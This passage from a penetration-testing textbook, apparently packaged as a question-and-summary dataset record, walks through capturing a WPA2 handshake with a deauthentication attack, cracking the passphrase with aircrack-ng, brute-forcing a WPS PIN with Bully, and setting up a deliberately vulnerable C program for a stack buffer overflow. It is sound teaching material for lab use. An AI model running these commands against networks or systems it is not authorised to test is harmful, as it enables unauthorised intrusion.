access point and the client. No authentication or master key step\noccurs, and instead of a RADIUS server and master key, WPA/WPA2 per-\nsonal use pre-shared keys, which are generated using pre-shared passphrases. The WPA/WPA2 personal passphrase that you enter when you connect\nto a secured network is static, whereas enterprise setups use dynamic keys\ngenerated by the RADIUS server. Enterprise setups are more secure, but most\npersonal networks and even most small businesses lack RADIUS servers. Wireless Attacks 351\nThe Four-Way Handshake\nIn the first phase of the connection between an access point and supplicant\n(client), a pairwise master key (PMK), which is static throughout the entire\nsession, is created. This is not the key that will be used for encryption itself,\nbut it will be used during the second phase, where a four-way handshake\nwill take place between access point and client, with the purpose of estab-\nlishing a channel of communication and exchanging the encryption keys\nused for further data communication, as shown in Figure 15-7. ANonce\nSNonce + MIC\nGTK + MIC\nAck\nFigure 15-7: WPA/WPA2 four-way handshake\nThis PMK is generated from the following:\n• The passphrase (pre-shared key, or PSK)\n• The access point’s SSID\n• The SSID length\n• The number of hashing iterations (4096)\n• The resulting length in bits (256) of the generated shared key (PMK)\nThese values are fed into a hashing algorithm called PBKDF2, which\ncreates a 256-bit shared key (PMK). While your passphrase (PSK) may be\nGeorgiaIsAwesome, this is not the PMK that will be used in a second phase. That said, anyone who knows the passphrase and the access point’s SSID\ncan use the PBKDF2 algorithm to generate the correct PMK. During the\nfour-way handshake, a pairwise transient key (PTK) is created and used to\nencrypt traffic between the access point and the client; a group transient\nkey (GTK) is exchanged and used to encrypt broadcast traffic. The PTK is\nmade up of the following:\n• The shared key (the PMK)\n• A random number (nonce) from the access point (ANonce)\n• A nonce from the client (SNonce)\n• The MAC address of the client\n• The MAC address of the access point\nThese values are fed into the PBKDF2 hashing algorithm to create\nthe PTK. To generate the PTK, the access point and the client exchange MAC\naddresses and nonces (random values). The static shared key (PMK) is never\nsent over the air, because both the access point and the client know the pass-\nphrase (PSK) and, thus, can generate the shared key independently. 352 Chapter 15\nThe shared nonces and MAC addresses are used by both the client and\nthe access point to generate the PTK. In the first step of the four-way hand-\nshake, the access point sends its nonce (ANonce). Next, the client chooses\na nonce, generates the PTK, and sends its nonce (SNonce) to the access\npoint. (The S in SNonce stands for supplicant, another name for the client\nin a wireless setup.)\nIn addition to sending its nonce, the client sends a message integrity\ncode (MIC) to guard against forgery attacks. In order to compute the correct\nMIC, the passphrase used to generate the pre-shared key must be correct, or\nthe PTK will be wrong. The access point independently generates the PTK\nbased on the SNonce and MAC address sent by the client, then checks the\nMIC sent by the client. If it’s correct, the client has authenticated successfully,\nand the access point sends over the GTK plus the MIC to the client. In the fourth part of the handshake, the client acknowledges the GTK. Cracking WPA/WPA2 Keys\nUnlike WEP, the cryptographic algorithms used in WPA and WPA2 are\nrobust enough to stop attackers from recovering the key simply by captur-\ning enough traffic and performing cryptanalysis. The Achilles’ heel in\nWPA/WPA2 personal networks lies in the quality of the pre-shared key\n(passphrase) used. If the Windows Administrator password you found during\npost exploitation is the same as the WPA or WPA2 personal passphrase or\nthe passphrase is written on a whiteboard in the front office of the organi-\nzation, it’s game over. To try to guess a weak password, we first need to capture the four-way\nhandshake for analysis. Recall that given the correct passphrase and the\nSSID of the access point, the PBKDF2 hashing algorithm can be used to\ngenerate the shared key (PMK). Given the PMK, we still need the ANonce,\nSNonce, and the MAC addresses of the access point and client to calculate\nthe PTK. Of course, the PTK will differ for each client, because the nonces\nwill differ in each four-way handshake, but if we can capture a four-way\nhandshake from any legitimate client, we can use its MAC addresses and\nnonces to calculate the PTK for a given passphrase. For example, we can\nuse the SSID and the passphrase password to generate a PMK, then com-\nbine the generated PMK with the captured nonces and MAC addresses to\ncalculate a PTK. If the MICs comes out like the ones in the captured hand-\nshake, we know that password is the correct passphrase. This technique can\nbe applied to a wordlist of possible passphrases to try to guess the correct\npassphrase. Luckily, if we can capture a four-way handshake and supply a\nwordlist, we have Aircrack-ng to take care of all the math. Using aircrack-ng to Crack WPa/WPa2 Keys\nTo use Aircrack-ng to crack WPA/WPA2, first set up your wireless access\npoint for WPA2 personal. Choose a pre-shared key (passphrase) and then\nconnect your host system to your access point to simulate a real client. Wireless Attacks 353\nTo use a wordlist to try to guess the WPA2 pre-shared key (passphrase),\nwe need to capture the four-way handshake. Enter airodump-ng -c 6 for the\nchannel, --bssid with the base station MAC address, -w to specify the filename\nfor output (use a different filename than you used in the WEP cracking\nexample), and mon0 for the monitor interface, as shown in Listing 15-12. root@kali:~# airodump-ng -c 6 --bssid 00:23:69:F5:B4:2B -w pentestbook2 mon0\nCH 6 ][ Elapsed: 4 s ][ 2015-05-19 16:31\nBSSID PWR RXQ Beacons #Data, #/s CH MB ENC CIPHER AUTH E\n00:23:69:F5:B4:2B -43 100 66 157 17 6 54 . WPA2 CCMP PSK l\nBSSID STATION PWR Rate Lost Frames Probe\n00:23:69:F5:B4:2B 70:56:81:B2:F0:53 -33 54-54 15 168 u\nListing 15-12: Airodump-ng for WPA2 cracking\nAs you can see the host is connected u. To capture a four-way hand-\nshake, we can either wait for another wireless client to sign on or speed up\nthe process by kicking a client off the network and forcing it to reconnect. To force a client to reconnect, use Aireplay-ng to send a message to a\nconnected client telling it that it is no longer connected to the access point. When the client reauthenticates, we’ll capture the four-way handshake\nbetween the client and access point. The Aireplay-ng options we’ll need are:\n• -0 means deauthentication. • 1 is the number of deauthentication requests to send. • -a 00:14:6C:7E:40:80 is the MAC address of the base station. • -c 00:0F:B5:FD:FB:C2 is the MAC address of the client to deauthenticate. Listing 15-13 shows the aireplay-ng command and the deauthentication\nrequest. root@kali:~# aireplay-ng -0 1 -a 00:23:69:F5:B4:2B -c 70:56:81:B2:F0:53 mon0\n16:35:11 Waiting for beacon frame (BSSID: 00:23:69:F5:B4:2B) on channel 6\n16:35:14 Sending 64 directed DeAuth. STMAC: [70:56:81:B2:F0:53] [24|66 ACKs]\nListing 15-13: Sending a deauthentication request to a client\nNow we return to the Airodump-ng window, as shown in Listing 15-14. CH 6 ][ Elapsed: 2 mins ][ 2015-11-23 17:10 ][ WPA handshake: 00:23:69:F5:B4:2B u\nBSSID PWR RXQ Beacons #Data, #/s CH MB ENC CIPHER AUTH ESSID\n00:23:69:F5:B4:2B -51 100 774 363 18 6 54 . WPA2 CCMP PSK linksys\n354 Chapter 15\nBSSID STATION PWR Rate Lost Frames Probe\n00:23:69:F5:B4:2B 70:56:81:B2:F0:53 -29 1 - 1 47 457\nListing 15-14: WPA2 handshake captured in Airodump-ng\nIf the Airodump-ng capture sees a four-way handshake with a client, it\nrecords it in the first line of the captured output u. Once you’ve captured the WPA2 handshake, close Airodump-ng, and\nopen the .cap file in Wireshark with File4Open4filename.cap. Once in\nWireshark, filter for the eapol protocol to see the four packets that make\nup the handshake, as shown in Figure 15-8.\n\nFigure 15-8: WPA2 handshake packets in Wireshark\nnote Sometimes Aircrack-ng will claim that the handshake has been captured, but when\nyou look at the packets in Wireshark, you will see you do not have all four messages. If\nthis is the case, run the deauthentication attack again, as you will need all four mes-\nsages to attempt to guess the correct key. Now we create a wordlist like the ones we used in Chapter 9, making\nsure that the correct WPA2 key is included in the list. The success of our\nattack against WPA2 is contingent on our ability to compare the hashed\nvalues for our passphrase with the values in the handshake. Once we have the handshake, we can do the rest of the calculations\nto recover the key offline; we no longer need to be in range of the access\npoint or send it any packets. Next we use Aircrack-ng to test the keys in\nthe wordlist, specifying a list with the -w option, as shown in Listing 15-15. Otherwise, the command is identical to cracking the WEP key. If the cor-\nrect key is in the wordlist, it will be recovered with Aircrack-ng. Wireless Attacks 355\nroot@kali:~# aircrack-ng -w password.lst -b 00:23:69:F5:B4:2B pentestbook2*.cap\nOpening pentestbook2-01.cap\nReading packets, please wait... Aircrack-ng 1.2 beta2\n[00:00:00] 1 keys tested (178.09 k/s)\nKEY FOUND! [ GeorgiaIsAwesome ] u\nMaster Key : 2F 8B 26 97 23 D7 06 FE 00 DB 5E 98 E3 8A C1 ED\n9D D9 50 8E 42 EE F7 04 A0 75 C4 9B 6A 19 F5 23\nTransient Key : 4F 0A 3B C1 1F 66 B6 DF 2F F9 99 FF 2F 05 89 5E\n49 22 DA 71 33 A0 6B CF 2F D3 BE DB 3F E1 DB 17\n\nB7 36 08 AB 9C E6 E5 15 5D 3F EA C7 69 E8 F8 22\n80 9B EF C7 4E 60 D7 9C 37 B9 7D D3 5C A0 9E 8C\n\nEAPOL HMAC : 91 97 7A CF 28 B3 09 97 68 15 69 78 E2 A5 37 54\nListing 15-15: Recovering a WPA2 key with Aircrack-ng\nAs you can see, the correct key is in our wordlist and is recovered u. This sort of dictionary attack against WPA/WPA2 can be prevented by\nusing a strong passphrase, as discussed in Chapter 9. Aircrack-ng is just one suite of tools for cracking wireless. It is ideal for\nbeginners, because starting different tools for each step of the process will\nhelp you become familiar with how these attacks work. Other widely used\nWi-Fi auditing tools that you may encounter are Kismet and Wifite. wi-Fi Protected setup\nWi-Fi Protected Setup (WPS) was designed to allow users to attach their\ndevices to secure networks with an eight-digit pin instead of a potentially\nlong and complicated passphrase. When the correct pin is supplied, the\naccess point sends over the passphrase. Problems with WPS\nThe last digit of the pin is a checksum for the previous seven digits, so the\nkeyspace should be 107, or 10,000,000 possible pins. However, when a pin\nis sent to the access point by the client, the validity of the first four digits\nand second four digits is reported separately. The first four digits are all\nin play, so there are 10,000 possibilities. Of the second four digits, only\nthe first three are in play (1000 possible guesses), so it would take at most\n11,000 guesses to brute-force the correct WPS pin. This decreases the time\nrequired to brute-force to under four hours. The only way to fix this issue is\nto disable WPS on the access point. 356 Chapter 15\nCracking WPS with Bully\nKali provides tools that you can use to implement a brute-force attack\nagainst WPS. One such tool is Bully. We can use Bully to brute-force the\nWPS pin as well as test a specific pin. To use Bully we need the SSID, MAC\naddress, and channel of the access point, which we found with iwlist at the\nbeginning of this chapter. Use the -b flag to specify the MAC address, the\n-e flag for the SSID, and the -c flag for the channel, as shown here. root@kali:~# bully mon0 -b 00:23:69:F5:B4:2B -e linksys -c 6\nBully should be able to brute-force the pin in around four hours and\nrecover the correct pre-shared PIN. WPS is enabled by default on many\nwireless access points and may be an easier way in than guessing a strong\nWPA/WPA2 passphrase. summary\nWireless security is an often-overlooked piece of an organization’s security\nposture. Time and money are put into securing the perimeter, deploy-\ning the latest firewalls and intrusion-prevention systems, but all this is for\nnaught if an attacker can just sit at the coffee shop across the street with\na strong antenna and join your corporate network. Wireless connections\nmay save corporations from lawsuits by distracted employees tripping over\nEthernet wires, but they introduce potential security vulnerabilities and\nshould be audited regularly. In this chapter, we used Aircrack-ng to recover\nWEP and WPA2 personal wireless keys by eavesdropping on and injecting\ntraffic into a wireless network, and we used Bully to brute-force a WPS pin. Wireless Attacks 357\nPaRT IV\ne xPloit De VeloPment\n16\na staCk-BaseD Buffer\noVerflow in linux\nSo far we’ve used tools such as Metasploit and public\nexploit code on the Internet to exploit our target sys-\ntems. But you may find a vulnerability in your pentest-\ning career that has no such exploit code, or you may\ndiscover a new security issue and want to write your\nown exploit code for it. In this chapter and the next\nthree, we will look at the basics of writing our own exploits. We won’t cover\neverything through the latest and greatest iPhone jailbreak, but we will look\nat some real-world examples of vulnerable programs and learn how to write\nworking exploits for them by hand. We’ll begin with a simple vulnerable program on our Linux target and\nmake the program do something its developer never intended. note All of the examples in Chapters 16 through 19 use x86 architecture. memory theory\nBefore we dive into writing our own exploits, we need to get a handle on\nthe basics of how memory works. Our goal is to manipulate memory and\ntrick the CPU into executing instructions on our behalf. We’ll use a tech-\nnique called a stack-based buffer overflow, which involves overfilling a variable\non the program’s memory stack and overwriting adjacent memory locations. But first, we need to know a little bit about how a program’s memory is laid\nout, as shown in Figure 16-1. low memory\ntext\ndata\nheap\nunused memory\nstack\nhigh memory\nFigure 16-1: Memory visualization\nThe text segment contains the program code to be executed, while\nthe data segment contains global information for the program. At higher\naddresses, we have a portion shared by the stack and heap, which are allo-\ncated at runtime. The stack is fixed in size and is used to store function\narguments, local variables, and so on. The heap holds dynamic variables. The stack consumption increases as more functions or subroutines are\ncalled, and the top of the stack points at lower memory addresses as more\ndata is stored on the stack. Our Intel-based CPU has general-purpose registers where it can store\ndata for future use. These include:\nEIP instruction pointer\nESP stack pointer\nEBP base pointer\nESI source index\nEDI destination index\nEAX accumulator\nEBX base\n362 Chapter 16\nECX counter\nEDX data\nESP, EBP, and EIP are particularly interesting to us. ESP and EBP\ntogether keep track of the stack frame of the currently executing function. As shown in Figure 16-2, ESP points to the top of the stack frame at its\nlowest memory address, and likewise, EBP points to the highest memory\naddress at the bottom of the stack frame. EIP holds the memory address of\nthe next instruction to be executed. Because our goal is to hijack execution\nand make the target machine execute what we want, EIP seems like a prime\ntarget for compromise. But how do we get our instructions to EIP? EIP is\nread only, so we can’t just put a memory address to be executed in this regis-\nter; we will need to be a bit cleverer. low memory\nESP\nmain’s stack frame\nEBP\nhigh memory\nFigure 16-2: Stack frame\nThe stack is a last-in, first-out data structure. You can think of it like a\nstack of lunch trays at a cafeteria. The last tray that is added to the stack is\nthe first tray that is taken off when one is needed. To add data to the stack,\na PUSH instruction is used. Likewise, to remove data from the stack, we use a\nPOP instruction. (Remember that the stack consumption increases to lower\nmemory addresses, so when data is pushed onto the current stack frame,\nESP moves to a lower address in memory.)\nWhen a program function is executed, a stack frame for its informa-\ntion (such as local variables) is pushed onto the stack. Once the function\nfinishes executing, the entire stack frame is unwound, ESP and EBP point\nback to the caller function’s stack frame, and execution continues in the\ncaller function where it left off. However, the CPU must know where in\nmemory to continue from, and it obtains that information from the return\naddress, which is pushed onto the stack when a function is called. Say, for instance, that we are running a C program. Naturally, the func-\ntion main is called when the program begins, and a stack frame is allocated\nfor it. main then calls another function, function1. Before pushing a stack\nframe for function1 onto the stack and handing over execution, main notes\nwhere execution will need to continue when function1 returns (typically the\nline of code directly after the call to function1) by pushing this value—its\nreturn address—onto the stack. Figure 16-3 shows the stack after main’s call\nto function1. A Stack-Based Buffer Overflow in Linux 363\nlow memory\nESP\nfunction1’s stack frame\nEBP Saved EBP from main\nreturn address\nmain’s stack frame\nhigh memory\nFigure 16-3: Stack after call to function1\nAfter function1 finishes, it returns, its stack frame is unwound, and the\nstored return address is loaded into the EIP register to restore execution\nto main. If we can control that return address, we can dictate which instruc-\ntions are executed when function1 returns. In the next section, we’ll look\nat a simple stack-based buffer overflow example to illustrate this point. Keep in mind a couple more things before we continue. In the\nexamples in this book, we’re using older operating systems to get around\nsome advanced antiexploitation techniques found on the most modern ver-\nsions of both Windows and Linux. Particularly, we’ll take advantage of\nthe lack of data execution prevention (DEP) and address space layout random-\nization (ASLR), because both of them would make it difficult to learn the\nbasics of exploitation. DEP sets specific memory sections as nonexecutable,\nwhich stops us from filling our stack with shellcode and pointing EIP to\nit for execution (as you’ll see in the Windows buffer overflow example in\nChapter 17). ASLR randomizes where our libraries are loaded in memory. In our examples, we’ll hardcode the return address to where we would like\nto go in memory, but in the post-ASLR exploit world, finding the correct\nplace to send execution can be a bit trickier. We’ll touch on more advanced\nexploit-writing techniques in Chapter 19, but for now let’s get comfortable\nwith the basics of how stack-based buffer overflows work. Linux Buffer overflow\nNow that we’re done with the mind-numbing theory, let’s see a basic example\nof a buffer overflow exploit in action on our Linux target. First, let’s make\nsure the target is set up correctly for a basic buffer overflow. Modern oper-\nating systems have checks in place to prevent these attacks, but while we are\nlearning, we need to turn them off. If you’re using the Linux target image\nprovided with this book, it’s already set up correctly, but to make sure,\ncheck that randomize_va_space is set to 0 as shown here. 364 Chapter 16\ngeorgia@ubuntu:~$ sudo nano /proc/sys/kernel/randomize_va_space\nrandomize_va_space, when set to 1 or 2, turns on ASLR on our target sys-\ntem. By default, randomization is turned on in Ubuntu, but we need this\nfeature off for our example. If the file includes the value 0, we’re all set. If\nnot, change the file contents to 0 and save it. A Vulnerable Program\nLet’s write a simple C program called overflowtest.c that is vulnerable to a\nstack-based buffer overflow, as shown in Listing 16-1. note This file is in georgia’s home directory on the Ubuntu target included in the book’s\ndownloads. georgia@ubuntu:~$ nano overflowtest.c\n#include <string.h>\n#include <stdio.h>\nu void overflowed() {\nprintf(\"%s\\n\", \"Execution Hijacked\");\n}\nv void function1(char *str){\nchar buffer[5];\nstrcpy(buffer, str);\n}\nw void main(int argc, char *argv[])\n{\nfunction1(argv[1]);\nprintf(\"%s\\n\", \"Executed normally\");\n}\nListing 16-1: Simple exploitable C program\nOur simple C program doesn’t do very much. It starts off by including\ntwo C libraries, stdio.h and string.h. These allow us to use the standard\ninput/output and string constructors in C without having to build them\nfrom scratch. We’ll want to use strings and output text to the console in our\nprogram. Next we have three functions: overflowed, function1, and main. If overflowed\nu is called, it prints the text “Execution Hijacked” to the console and then\nreturns. If function1 v is called, it declares a local variable, a five-character\nstring called buffer, and copies the contents of a variable passed to function1\ninto buffer. Called by default when the program starts, main w calls function1\nand passes it the first command line argument the program received. After\nfunction1 returns, main prints the text “Executed normally” to the console,\nand the program exits. A Stack-Based Buffer Overflow in Linux 365\nNotice that under normal circumstances, overflowed is never called, so\n“Execution Hijacked” should never appear in the console. (You’ll learn why\nit’s in the program at all when we overflow the buffer and hijack control of\nthe program.)\nNow we compile our program as shown here. georgia@ubuntu:~$ gcc -g -fno-stack-protector -z execstack -o overflowtest overflowtest.c\nTo compile our C code as shown above, we use GCC, the GNU Compiler\nCollection, which is built into Ubuntu by default. The -g option tells GCC\nto add extra debugging information for GDB, the GNU debugger.\n\nWe use\nthe -fno-stack-protector flag to turn off GCC’s stack-protection mechanism,\nwhich would attempt to prevent buffer overflows if we left it turned on. The\n-z execstack compiler option makes the stack executable, disabling another\nbuffer overflow prevention method. We tell GCC to compile overflowtest.c\ninto an executable called overflowtest with the -o option. Recall that main takes the first command line argument to the program\nand feeds it to function1, which copies the value into a five-character local\nvariable. Let’s run the program with the command line argument AAAA, as\nshown here. Make overflowtest executable with chmod if necessary. We use\nfour As instead of five because a string ends with a null byte. Technically, if\nwe used five As, we would already be overflowing the buffer, albeit by just\none character. georgia@ubuntu:~$ ./overflowtest AAAA\nExecuted normally\nAs shown, the program does what we expected: main calls function1,\nfunction1 copies AAAA into buffer, function1 returns execution to main, and main\nprints “Executed normally” to the console before the program exits. Maybe\nif we give overflowtest some unexpected input, we can force it to behave in a\nway that will help us cause a buffer overflow. Causing a Crash\nNow let’s try giving the program a long string of As as an argument, as\nshown here. georgia@ubuntu:~$ ./overflowtest AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nSegmentation fault\nThis time, the program crashes with a segmentation fault. Our pro-\ngram’s problem lies with the implementation of strcpy, which we use in\nfunction1. The strcpy function takes one string and copies it into another,\nbut it does not do any bounds checking to make sure the supplied argu-\nment will fit into the destination string variable. The strcpy function\nwill attempt to copy three, five, or even hundreds of characters into our\n366 Chapter 16\nfive-character destination string. If our string is five characters long and\nwe copy in 100 characters, the other 95 will end up overwriting data at\nadja cent memory addresses in the stack.\nWe could potentially overwrite the rest of function1’s stack frame and\neven higher memory. Remember what’s at the memory address immedi-\nately after the base of that stack frame? Before the frame was pushed on\nthe stack, main pushed its return address onto the stack to designate where\nexecution should continue once function1 returns. If the string we copy into\nbuffer is long enough, we’ll overwrite memory from buffer straight through\nto EBP, over the return address, and even into main’s stack frame.\nOnce strcpy places the first argument from overflowtest into buffer,\nfunction1 returns back to main. Its stack frame is popped off the stack, and\nthe CPU tries to execute the instruction at the memory location in the return\naddress. Because we’ve overwritten the return address with a long string of\nAs, as shown in Figure 16-4, the CPU will try to execute the instructions at\nthe memory address 41414141 (the hexadecimal representation of four As).\nlow memory\nESP\nfunction1’s stack frame\nbuffer = [AAAAA]\n\nEBP AAAA\nreturn address AAAA",
    "question": "What are the key differences between WEP and WPA/WPA2 in terms of security and how do these differences affect the ability to crack wireless network keys?",
    "summary": "Airodump-ng captures MAC addresses and identifies open wireless networks, which are insecure as they allow unencrypted data transmission. WEP, an older encryption method, is vulnerable due to weak IVs and ICVs, making it easy to crack. Aircrack-ng can be used to recover WEP keys by analyzing captured packets. WPA and WPA2 are more secure but still susceptible to attacks if weak passphrases are used. WPS can be brute-forced with tools like Bully. Wireless security is crucial for an organization's overall security, and networks should be regularly audited."
  },
  {
    "start": 106,
    "end": 112,
    "text": "AAAA\nmain’s stack frame\nhigh memory\nFigure 16-4: Memory after strcpy is executed\nHowever, our program can’t read, write, or execute from anywhere it\nlikes in memory because that would cause utter chaos. The memory address\n41414141 is out of bounds for our program, and it crashes with the segmenta-\ntion fault we saw at the beginning of this section. In the next section, we’ll take a closer look behind the scenes when the\nprogram crashes. In GDB, discussed next, you can use the command mainte-\nnance info sections to see which memory regions are mapped to the process. Running GDB\nWe can see exactly what’s happening in memory by running our program\nin a debugger. Our Ubuntu machine comes with GDB, so let’s open the pro-\ngram in the debugger, as shown here, and watch what happens in memory\nif we overflow our five-character buffer. A Stack-Based Buffer Overflow in Linux 367\ngeorgia@ubuntu:~$ gdb overflowtest\n(gdb)\nBefore we run the program, we’ll set some breakpoints to pause execu-\ntion at certain points in the program and allow us to view the state of\nmemory at those times. Because we compiled the program with the -g\nflag, we can view the source code directly, as shown in Listing 16-2, and set\nbreakpoints at the lines where we would like to pause. (gdb) list 1,16\n1 #include <string.h>\n2 #include <stdio.h>\n3\n4 void overflowed() {\n5 printf(\"%s\\n\", \"Execution Hijacked\");\n6 }\n7\n8 void function(char *str){\n9 char buffer[5];\n10 strcpy(buffer, str); u\n11 } v\n12 void main(int argc, char *argv[])\n13 {\n14 function(argv[1]); w\n15 printf(\"%s\\n\", \"Executed normally\");\n16 }\n(gdb)\nListing 16-2: Viewing source code in GDB\nFirst, let’s pause the program right before main calls function1 at w, just\nbefore the instruction is executed. We’ll also set two more breakpoints, inside\nfunction1, right before strcpy is executed at u, and directly afterward, at v. Setting breakpoints in GDB is shown in Listing 16-3. Set breakpoints at\nlines 14, 10, and 11 by using the GDB command break. (gdb) break 14\nBreakpoint 1 at 0x8048433: file overflowtest.c, line 14. (gdb) break 10\nBreakpoint 2 at 0x804840e: file overflowtest.c, line 10. (gdb) break 11\nBreakpoint 3 at 0x8048420: file overflowtest.c, line 11. (gdb)\nListing 16-3: Setting breakpoints in GDB\nBefore we overflow buffer and cause the program to crash, let’s run it\nwith just four As, as shown here, and watch memory as the program exe-\ncutes normally. (gdb) run AAAA\nStarting program: /home/georgia/overflowtest AAAA\n368 Chapter 16\nBreakpoint 1, main (argc=2, argv=0xbffff5e4) at overflowtest.c:14\n14 function(argv[1]);\nWe use the GDB command run followed by arguments to start the pro-\ngram in the debugger. Here we run the program with four As as an argu-\nment. We hit our first breakpoint just before function1 is called, at which\ntime we can examine the program’s memory using the GDB command x. GDB needs to know which part of memory we want to see and how\nit should be displayed. Memory contents can be displayed in octal, hexa-\ndecimal, decimal, or binary format. We’ll see a lot of hexadecimal in our\njourney through exploit development, so let’s use the x flag to tell GDB to\ndisplay our memory in hexadecimal format. We can also output memory in increments of one byte, a two-byte half-\nword, a four-byte word, and an eight-byte giant. Let’s look at 16 hexadecimal\nformat words starting at the ESP register with the command x/16xw $esp, as\nshown in Listing 16-4. (gdb) x/16xw $esp\n0xbffff540: 0xb7ff0f50 0xbffff560 0xbffff5b8 0xb7e8c685\n0xbffff550: 0x08048470 0x08048340 0xbffff5b8 0xb7e8c685\n0xbffff560: 0x00000002 0xbffff5e4 0xbffff5f0 0xb7fe2b38\n0xbffff570: 0x00000001 0x00000001 0x00000000 0x08048249\nListing 16-4: Examining the contents of memory\nThe x/16xw $esp command prints out 16 four-byte words in hexadecimal\nformat, starting with ESP. Recall from earlier in the chapter that ESP marks the\nlowest memory address in our stack. Because our first breakpoint paused exe-\ncution right before the call to function1, ESP is at the top of main’s stack frame. The output of memory in GDB in Listing 16-4 might be a bit confusing at\nfirst, so let’s break it down. On the far left, we have our memory addresses in\n16-byte increments, followed by the contents of memory at those addresses. In this case, the first four bytes will be the contents of ESP followed by addi-\ntional memory, starting at ESP and continuing down the stack. We can find EBP, which points at the bottom (or highest address) of main’s\nstack frame, by examining EBP as shown here with the command x/1xw $ebp. (gdb) x/1xw $ebp\n0xbffff548: 0xbffff5b8\n(gdb)\nThis command allows us to examine one hexadecimal word from EBP\nto find the memory location and contents of the EBP register. Based on the\noutput, main’s stack frame looks like this:\n0xbffff540: 0xb7ff0f50 0xbffff560 0xbffff5b8\nAs you can see, there’s not much to it, but then again, all main does is\ncall another function and then print a line of text to the screen; there’s no\nheavy-duty processing required. A Stack-Based Buffer Overflow in Linux 369\nBased on what we know about the stack, we can expect that when we let\nthe program continue and function1 is called, the return address for main\nand a stack frame for function1 will be pushed onto the stack. Remember\nthat the stack grows to lower memory addresses, so the top of the stack will\nbe at a lower memory address when we hit our next breakpoint inside of\nfunction1. Recall that our next breakpoint is inside function1 right before the\nstrcpy command is executed. Use the command continue to let the program\nrun until the next breakpoint, as shown in Listing 16-5. (gdb) continue\nContinuing. Breakpoint 2, function (str=0xbffff74c \"AAAA\") at overflowtest.c:10\n10 strcpy(buffer, str);\n(gdb) x/16xw $espu\n0xbffff520: 0xb7f93849 0x08049ff4 0xbffff538 0x080482e8\n0xbffff530: 0xb7fcfff4 0x08049ff4 0xbffff548 0x08048443\n0xbffff540: 0xbffff74f 0xbffff560 0xbffff5b8 0xb7e8c685\n0xbffff550: 0x08048470 0x08048340 0xbffff5b8 0xb7e8c685\n(gdb) x/1xw $ebpv\n0xbffff538: 0xbffff548\nListing 16-5: Breakpoint before the strcpy command\nAfter using the continue command to run the program until the next\nbreakpoint, examine ESP at u and EBP at v to see the contents of function1’s\nstack frame. function1’s stack frame is shown here. 0xbffff520: 0xb7f93849 0x08049ff4 0xbffff538 0x080482e8\n0xbffff530: 0xb7fcfff4 0x08049ff4 0xbffff548\nThe stack frame for function1 is a bit larger than main’s. There’s some\nmemory allocated for the local variable buffer, along with a little extra space\nfor strcpy to work with, but there’s certainly not enough room for 30 or 40 As. Recall from the last breakpoint that main’s stack frame began at memory\naddress 0xbffff540. Based on our knowledge of the stack, 0x08048443, the\nfour-byte memory address between function1’s stack frame and main’s stack\nframe, should be our return address for main. Let’s disassemble main with the\ndisass command, as shown in Listing 16-6, to see where 0x08048443 comes in. (gdb) disass main\nDump of assembler code for function main:\n0x08048422 <main+0>: lea 0x4(%esp),%ecx\n0x08048426 <main+4>: and $0xfffffff0,%esp\n0x08048429 <main+7>: pushl -0x4(%ecx)\n0x0804842c <main+10>: push %ebp\n0x0804842d <main+11>: mov %esp,%ebp\n0x0804842f <main+13>: push %ecx\n0x08048430 <main+14>: sub $0x4,%esp\n0x08048433 <main+17>: mov 0x4(%ecx),%eax\n0x08048436 <main+20>: add $0x4,%eax\n0x08048439 <main+23>: mov (%eax),%eax\n370 Chapter 16\n0x0804843b <main+25>: mov %eax,(%esp)\n0x0804843e <main+28>: call 0x8048408 <function1> u\n0x08048443 <main+33>: movl $0x8048533,(%esp) v\n0x0804844a <main+40>: call 0x804832c <puts@plt>\n0x0804844f <main+45>: add $0x4,%esp\n0x08048452 <main+48>: pop %ecx\n0x08048453 <main+49>: pop %ebp\n0x08048454 <main+50>: lea -0x4(%ecx),%esp\n0x08048457 <main+53>: ret\nEnd of assembler dump. Listing 16-6: Disassembled main function\nIf you aren’t fluent in assembly code, don’t worry. The instruction we’re\nlooking for jumps out at us in plain English: At 0x0804843e u, main calls the\nmemory address of function1. It stands to reason that the next instruction to\nbe executed when function1 exits (and thus our return address) will be the\nnext instruction in the list. And sure enough, the next line at v shows the\nreturn address we found on the stack. Everything looks just like the theory\nsays it should. Let’s allow the program to continue and see what happens in memory\nwhen our four As are copied into buffer. After the program pauses at the\nthird breakpoint, examine memory in the usual way, as shown in Listing 16-7. (gdb) continue\nContinuing.\n\nBreakpoint 3, function (str=0xbffff74c \"AAAA\") at overflowtest.c:11\n11 }\n(gdb) x/16xw $esp\n0xbffff520: 0xbffff533 0xbffff74c 0xbffff538 0x080482e8\n0xbffff530: 0x41fcfff4 0x00414141u 0xbffff500 0x08048443\n0xbffff540: 0xbffff74c 0xbffff560 0xbffff5b8 0xb7e8c685\n0xbffff550: 0x08048470 0x08048340 0xbffff5b8 0xb7e8c685\n(gdb) x/1xw $ebp\n0xbffff538: 0xbffff500\nListing 16-7: Examining memory at breakpoint 3\nAs shown, we’re still inside function1, so our stack frame location is the\nsame. Inside function1’s stack frame, we can see our four As u represented in\nhexadecimal as 41 followed by 00 for the ending null byte. They fit nicely\nin our five-character buffer, so our return address is still intact, and every-\nthing works as expected when we let the program continue, as shown in\nListing 16-8. (gdb) continue\nContinuing. Executed normally\nProgram exited with code 022. (gdb)\nListing 16-8: The program finishes normally. A Stack-Based Buffer Overflow in Linux 371\nSure enough, “Executed normally” prints to the screen. Now, let’s run the program again, this time overflowing our buffer with\ntoo many characters, and watch what happens in memory. Crashing the Program in GDB\nWe could enter a long string of As, or we could let the Perl scripting language\ngenerate that string for us, as shown in Listing 16-9. (Perl will come in handy\nlater when we try to hijack execution with an actual memory address rather\nthan crash the program.)\n(gdb) run $(perl -e 'print \"A\" x 30') u\nStarting program: /home/georgia/overflowtest $(perl -e 'print \"A\" x 30')\nBreakpoint 1, main (argc=2, argv=0xbffff5c4) at overflowtest.c:14\n14 function(argv[1]);\n(gdb) x/16xw $esp\n0xbffff520: 0xb7ff0f50 0xbffff540 0xbffff598 0xb7e8c685\n0xbffff530: 0x08048470 0x08048340 0xbffff598 0xb7e8c685\n0xbffff540: 0x00000002 0xbffff5c4 0xbffff5d0 0xb7fe2b38\n0xbffff550: 0x00000001 0x00000001 0x00000000 0x08048249\n(gdb) x/1xw $ebp\n0xbffff528: 0xbffff598\n(gdb) continue\nListing 16-9: Running the program with 30 As as an argument\nHere we tell Perl to execute the command print to make a string of 30 As\nand feed the results in as the argument to overflowtest u. When strcpy tries\nto place such a long string into our five-character buffer, 